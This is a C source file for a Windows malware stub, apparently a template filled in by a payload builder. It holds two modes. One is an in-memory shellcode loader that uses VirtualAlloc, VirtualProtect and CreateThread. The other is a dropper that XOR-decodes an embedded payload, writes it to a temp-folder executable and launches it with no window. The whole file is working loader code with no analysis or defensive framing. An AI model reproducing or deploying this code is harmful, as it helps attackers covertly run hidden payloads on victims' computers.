// stub.c
#include <windows.h>
#include <stdint.h>
#include <stdio.h>

#ifdef SHELLCODE_MODE
// ─── In-memory shellcode loader ────────────────────────────────────────────
unsigned char shellcode[] = { PAYLOAD_BYTES };
size_t shellcode_len     = sizeof(shellcode);

int main(void) {
    void *exec = VirtualAlloc(NULL,
                              shellcode_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!exec) return -1;

    memcpy(exec, shellcode, shellcode_len);
    DWORD old;
    VirtualProtect(exec, shellcode_len,
                   PAGE_EXECUTE_READ, &old);

    HANDLE th = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)exec,
        NULL, 0, NULL);
    WaitForSingleObject(th, INFINITE);
    return 0;
}

#else
// ─── EXE dropper + XOR decoder ─────────────────────────────────────────────
unsigned char payload[]   = { PAYLOAD_BYTES };
const size_t payload_len  = sizeof(payload);
#define XOR_KEY PAYLOAD_KEY

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR cmdLine, int showWhat) 
{
    // 1) Decode in place
    for (size_t i = 0; i < payload_len; i++)
        payload[i] ^= XOR_KEY;

    // 2) Build temp-filename
    CHAR tmpPath[MAX_PATH+1];
    if (!GetTempPathA(MAX_PATH, tmpPath)) return -1;
    CHAR tmpFile[MAX_PATH+1];
    snprintf(tmpFile, MAX_PATH,
             "%stmp%lx.exe", tmpPath, GetTickCount());

    // 3) Dump to disk
    HANDLE f = CreateFileA(tmpFile,
                           GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);
    if (f == INVALID_HANDLE_VALUE) return -2;
    DWORD written;
    WriteFile(f, payload,
              (DWORD)payload_len,
              &written, NULL);
    CloseHandle(f);

    // 4) Launch silently
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(tmpFile,
                        NULL, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi))
    {
        return -3;
    }
    return 0;
}
#endif
